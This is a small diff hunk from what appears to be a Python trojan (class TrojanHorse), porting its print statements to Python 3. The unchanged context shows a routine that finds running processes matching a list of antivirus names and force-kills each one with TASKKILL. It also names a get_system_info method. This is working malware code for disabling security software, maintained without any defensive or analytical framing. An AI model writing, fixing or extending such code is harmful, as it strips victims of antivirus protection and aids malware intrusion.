@@ -30,11 +30,11 @@ class TrojanHorse:
         for i in processes.split(" "):
             if ".exe" in i:
                 ps.append(i.replace("K\n","").replace("\n",""))
-        print "[*] Killing Antivirus services on this pc"
+        print("[*] Killing Antivirus services on this pc")
         for av in avs:
             for p in ps:
                 if p==av:
-                    print "[*] killing off "+av
+                    print("[*] killing off "+av)
                     os.popen("TASKKILL /F /IM {}".format(p))
 
     def get_system_info(self):
